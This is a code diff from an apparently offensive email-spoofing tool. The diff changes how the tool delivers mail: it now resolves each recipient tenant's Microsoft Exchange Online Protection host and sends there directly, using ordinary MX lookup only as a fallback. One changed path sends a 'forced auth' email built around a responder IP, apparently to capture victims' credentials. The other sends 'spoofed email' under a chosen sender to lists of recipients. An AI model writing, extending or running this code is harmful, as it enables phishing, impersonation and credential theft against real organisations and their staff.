@@ -653,17 +653,34 @@ def prompt_forced():
     subject, tmpl = cfg
     body  = create_forced_auth_email(tmpl, responder_ip)
     rcp_domain = recipient.split("@")[1]
-    mx    = get_mx_record(rcp_domain)
-    if not mx:
+    smtp_ip = None
+    route = ""
+    eop_host = get_eop_hostname(rcp_domain)
+    try:
+        smtp_ip = dns.resolver.resolve(eop_host, "A")[0].to_text()
+        route = f"EOP → {eop_host}"
+    except Exception:
+        tenant = get_tenant_info(rcp_domain)
+        if tenant and tenant.get("tenant_name"):
+            alt_host = tenant["tenant_name"] + ".mail.protection.outlook.com"
+            try:
+                smtp_ip = dns.resolver.resolve(alt_host, "A")[0].to_text()
+                route = f"EOP → {alt_host}"
+            except Exception:
+                pass
+    if not smtp_ip:
+        smtp_ip = get_mx_record(rcp_domain)
+        route = f"MX → {rcp_domain}"
+    if not smtp_ip:
         return
     print(f"\n  {'─' * 50}")
     print(f"  From    : {sender}")
     print(f"  To      : {recipient}")
     print(f"  Subject : {subject}")
-    print(f"  Via     : MX ({mx})")
+    print(f"  Via     : {route}  ({smtp_ip})")
     print(f"  {'─' * 50}")
     if input("\n  Send? [y/N]: ").strip().lower() == "y":
-        send_email(mx, sender, recipient, subject, body)
+        send_email(smtp_ip, sender, recipient, subject, body)
     else:
         print(f"  {YELLOW}Cancelled.{RESET}")
 
@@ -900,12 +917,34 @@ def main():
             subject, body = cfg
             print(f"  [*] Spoofed email → {len(recipients)} recipient(s)")
 
+        route_cache = {}
         for rcp in recipients:
             rcp_domain = rcp.split("@")[1]
-            mx = get_mx_record(rcp_domain)
-            if not mx:
+            if rcp_domain not in route_cache:
+                smtp_ip = None
+                route = ""
+                eop_host = get_eop_hostname(rcp_domain)
+                try:
+                    smtp_ip = dns.resolver.resolve(eop_host, "A")[0].to_text()
+                    route = f"EOP → {eop_host}"
+                except Exception:
+                    tenant = get_tenant_info(rcp_domain)
+                    if tenant and tenant.get("tenant_name"):
+                        alt_host = tenant["tenant_name"] + ".mail.protection.outlook.com"
+                        try:
+                            smtp_ip = dns.resolver.resolve(alt_host, "A")[0].to_text()
+                            route = f"EOP → {alt_host}"
+                        except Exception:
+                            pass
+                if not smtp_ip:
+                    smtp_ip = get_mx_record(rcp_domain)
+                    route = f"MX → {rcp_domain}"
+                route_cache[rcp_domain] = (smtp_ip, route)
+            smtp_ip, route = route_cache[rcp_domain]
+            if not smtp_ip:
                 continue
-            send_email(mx, args.sender, rcp, subject, body)
+            print(f"  {DIM}[→] {route}{RESET}")
+            send_email(smtp_ip, args.sender, rcp, subject, body)
         return
 
     parser.print_help()
